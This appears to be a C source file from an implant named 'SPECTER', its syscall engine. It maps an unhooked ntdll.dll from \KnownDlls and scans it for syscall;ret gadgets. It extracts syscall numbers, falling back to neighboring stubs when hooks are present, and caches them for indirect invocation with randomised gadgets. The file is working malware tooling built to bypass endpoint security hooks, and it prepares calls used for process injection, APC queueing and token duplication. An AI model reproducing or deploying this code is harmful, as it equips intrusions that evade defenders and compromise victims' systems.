/**
 * SPECTER Implant — Syscall Engine
 *
 * Maps a clean copy of ntdll.dll from \KnownDlls, extracts SSNs
 * from unhooked stubs, and caches them for indirect invocation.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "syscalls.h"

/* ------------------------------------------------------------------ */
/*  Static syscall table instance (no extern — avoids .refptr entries)  */
/* ------------------------------------------------------------------ */

static SYSCALL_TABLE g_syscall_table;

SYSCALL_TABLE *sc_get_table(void) {
    return &g_syscall_table;
}

/* ------------------------------------------------------------------ */
/*  Required Nt* hashes to populate during init                        */
/* ------------------------------------------------------------------ */

static const DWORD g_required_hashes[] = {
    HASH_NTALLOCATEVIRTUALMEMORY,
    HASH_NTPROTECTVIRTUALMEMORY,
    HASH_NTFREEVIRTUALMEMORY,
    HASH_NTWRITEVIRTUALMEMORY,
    HASH_NTREADVIRTUALMEMORY,
    HASH_NTCREATETHREADEX,
    HASH_NTOPENPROCESS,
    HASH_NTCLOSE,
    HASH_NTMAPVIEWOFSECTION,
    HASH_NTUNMAPVIEWOFSECTION,
    HASH_NTCREATEFILE,
    HASH_NTQUERYINFORMATIONPROCESS,
    HASH_NTSETINFORMATIONTHREAD,
    HASH_NTDELAYEXECUTION,
    HASH_NTWAITFORSINGLEOBJECT,
    HASH_NTQUEUEAPCTHREAD,
    HASH_NTOPENSECTION,
    HASH_NTRESUMETHREAD,
    HASH_NTTERMINATETHREAD,
    HASH_NTREADFILE,
    HASH_NTWRITEFILE,
    HASH_NTCREATESECTION,
    HASH_NTCONTINUE,
    HASH_NTOPENKEY,
    HASH_NTQUERYVALUEKEY,
    HASH_NTSETVALUEKEY,
    HASH_NTDELETEVALUEKEY,
    HASH_NTCREATEKEY,
    HASH_NTOPENPROCESSTOKEN,
    HASH_NTDUPLICATETOKEN,
    HASH_NTQUERYDIRECTORYFILE,
};

#define REQUIRED_COUNT (sizeof(g_required_hashes) / sizeof(g_required_hashes[0]))

/* ------------------------------------------------------------------ */
/*  NT function typedefs for bootstrap (resolved from loaded ntdll)     */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (*fn_NtOpenSection)(PHANDLE, ULONG, POBJECT_ATTRIBUTES);
typedef NTSTATUS (*fn_NtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR,
    SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);

/* ------------------------------------------------------------------ */
/*  sc_find_gadget — locate syscall;ret (0F 05 C3) in ntdll .text      */
/* ------------------------------------------------------------------ */

PVOID sc_find_gadget(PVOID clean_ntdll) {
    PBYTE base = (PBYTE)clean_ntdll;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != 0x5A4D)
        return NULL;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != 0x00004550)
        return NULL;

    /* Walk sections to find .text */
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)(
        (PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        /* Check if this is an executable section */
        if (sec[i].Characteristics & 0x20000000) {  /* IMAGE_SCN_MEM_EXECUTE */
            PBYTE section_start = base + sec[i].VirtualAddress;
            DWORD section_size  = sec[i].VirtualSize;

            /* Scan for 0F 05 C3 (syscall; ret) */
            for (DWORD j = 0; j + 2 < section_size; j++) {
                if (section_start[j]     == 0x0F &&
                    section_start[j + 1] == 0x05 &&
                    section_start[j + 2] == 0xC3) {
                    return (PVOID)(section_start + j);
                }
            }
        }
    }

    return NULL;
}

/* ------------------------------------------------------------------ */
/*  sc_find_gadgets — locate all syscall;ret (0F 05 C3) in ntdll .text  */
/* ------------------------------------------------------------------ */

DWORD sc_find_gadgets(PVOID ntdll_base, PVOID *pool, DWORD max_gadgets) {
    DWORD count = 0;
    PBYTE base = (PBYTE)ntdll_base;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != 0x5A4D)
        return 0;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != 0x00004550)
        return 0;

    /* Walk sections to find executable (.text) section */
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)(
        (PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & 0x20000000) {  /* IMAGE_SCN_MEM_EXECUTE */
            PBYTE p   = base + sec[i].VirtualAddress;
            PBYTE end = p + sec[i].VirtualSize - 3;

            while (p < end && count < max_gadgets) {
                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) {
                    pool[count++] = (PVOID)p;
                    p += 3;  /* skip past this gadget */
                } else {
                    p++;
                }
            }
        }
    }

    return count;
}

/* ------------------------------------------------------------------ */
/*  sc_resolve_ssn — extract SSN from Nt* stub in clean ntdll           */
/* ------------------------------------------------------------------ */
/*  Expected stub pattern (unhooked):                                   */
/*    4C 8B D1          mov r10, rcx                                    */
/*    B8 XX XX 00 00    mov eax, SSN                                    */
/* ------------------------------------------------------------------ */

DWORD sc_resolve_ssn(PVOID clean_ntdll, DWORD func_hash) {
    PVOID func_addr = find_export_by_hash(clean_ntdll, func_hash);
    if (!func_addr)
        return (DWORD)-1;

    PBYTE stub = (PBYTE)func_addr;

    /* Verify the expected unhooked stub pattern */
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        /* SSN is the little-endian DWORD at offset 4 */
        return *(DWORD *)(stub + 4);
    }

    /* Hooked stub fallback: scan nearby stubs for a neighbor with valid      */
    /* pattern, then compute our SSN from the neighbor's SSN + offset.        */
    /* Walk up (lower addresses) looking for an unhooked neighbor.            */
    for (int offset = 1; offset < 32; offset++) {
        PBYTE neighbor_down = stub - (offset * 32);
        if (neighbor_down[0] == 0x4C && neighbor_down[1] == 0x8B &&
            neighbor_down[2] == 0xD1 && neighbor_down[3] == 0xB8) {
            DWORD neighbor_ssn = *(DWORD *)(neighbor_down + 4);
            return neighbor_ssn + (DWORD)offset;
        }

        PBYTE neighbor_up = stub + (offset * 32);
        if (neighbor_up[0] == 0x4C && neighbor_up[1] == 0x8B &&
            neighbor_up[2] == 0xD1 && neighbor_up[3] == 0xB8) {
            DWORD neighbor_ssn = *(DWORD *)(neighbor_up + 4);
            return neighbor_ssn - (DWORD)offset;
        }
    }

    return (DWORD)-1;
}

/* ------------------------------------------------------------------ */
/*  sc_get_entry — cache lookup by function hash                        */
/* ------------------------------------------------------------------ */

SYSCALL_ENTRY *sc_get_entry(SYSCALL_TABLE *table, DWORD func_hash) {
    for (DWORD i = 0; i < table->count; i++) {
        if (table->entries[i].hash == func_hash)
            return &table->entries[i];
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  sc_init — initialize syscall table from a clean ntdll mapping       */
/* ------------------------------------------------------------------ */

NTSTATUS sc_init(SYSCALL_TABLE *table) {
    spec_memset(table, 0, sizeof(SYSCALL_TABLE));

    /* ----- Step 1: Map a clean ntdll from \KnownDlls ----- */

    /* Bootstrap: resolve NtOpenSection and NtMapViewOfSection from the
       already-loaded (potentially hooked) ntdll via PEB walking. We only
       use these two calls to get a clean mapping; after that, all
       subsequent syscalls go through indirect invocation. */
    fn_NtOpenSection     pNtOpenSection     = (fn_NtOpenSection)
        resolve_function(HASH_NTDLL_DLL, HASH_NTOPENSECTION);
    fn_NtMapViewOfSection pNtMapViewOfSection = (fn_NtMapViewOfSection)
        resolve_function(HASH_NTDLL_DLL, HASH_NTMAPVIEWOFSECTION);

    if (!pNtOpenSection || !pNtMapViewOfSection)
        return STATUS_PROCEDURE_NOT_FOUND;

    /* Build the \KnownDlls\ntdll.dll object name */
    WCHAR knowndlls_path[] = { '\\','K','n','o','w','n','D','l','l','s',
                               '\\','n','t','d','l','l','.','d','l','l', 0 };
    UNICODE_STRING us_path;
    us_path.Buffer        = knowndlls_path;
    us_path.Length        = (USHORT)(spec_wcslen(knowndlls_path) * sizeof(WCHAR));
    us_path.MaximumLength = us_path.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE section_handle = NULL;
    NTSTATUS status = pNtOpenSection(&section_handle,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);

    if (!NT_SUCCESS(status))
        return status;

    /* Map the clean ntdll section into our process */
    PVOID   clean_base = NULL;
    SIZE_T  view_size  = 0;
    HANDLE  current_process = (HANDLE)(ULONG_PTR)-1;  /* NtCurrentProcess() */

    status = pNtMapViewOfSection(section_handle, current_process,
        &clean_base, 0, 0, NULL, &view_size, ViewShare, 0, PAGE_READONLY);

    /* Close section handle regardless of map outcome.  We need NtClose
       but don't have the syscall table yet, so call through loaded ntdll. */
    typedef NTSTATUS (*fn_NtClose)(HANDLE);
    fn_NtClose pNtClose = (fn_NtClose)
        resolve_function(HASH_NTDLL_DLL, HASH_NTCLOSE);
    if (pNtClose)
        pNtClose(section_handle);

    if (!NT_SUCCESS(status))
        return status;

    table->clean_ntdll = clean_base;

    /* ----- Step 2: Find syscall;ret gadget pool ----- */

    table->gadget_count = sc_find_gadgets(clean_base, table->gadget_pool, MAX_GADGETS);

    /* Fallback to single gadget if pool scan found nothing */
    if (table->gadget_count == 0) {
        PVOID gadget = sc_find_gadget(clean_base);
        if (!gadget)
            return STATUS_PROCEDURE_NOT_FOUND;
        table->gadget_pool[0] = gadget;
        table->gadget_count = 1;
    }

    /* ----- Step 3: Resolve SSNs for all required Nt* functions ----- */

    for (DWORD i = 0; i < REQUIRED_COUNT; i++) {
        DWORD ssn = sc_resolve_ssn(clean_base, g_required_hashes[i]);
        if (ssn == (DWORD)-1)
            continue;

        DWORD idx = table->count;
        if (idx >= SYSCALL_TABLE_CAPACITY)
            break;

        table->entries[idx].ssn  = ssn;
        table->entries[idx].hash = g_required_hashes[i];

        /* Assign a random gadget from the pool using RDTSC-based selection */
        DWORD tick;
        __asm__ volatile ("rdtsc" : "=a" (tick) : : "edx");
        table->entries[idx].syscall_addr = table->gadget_pool[tick % table->gadget_count];

        table->count++;
    }

    if (table->count == 0)
        return STATUS_UNSUCCESSFUL;

    return STATUS_SUCCESS;
}
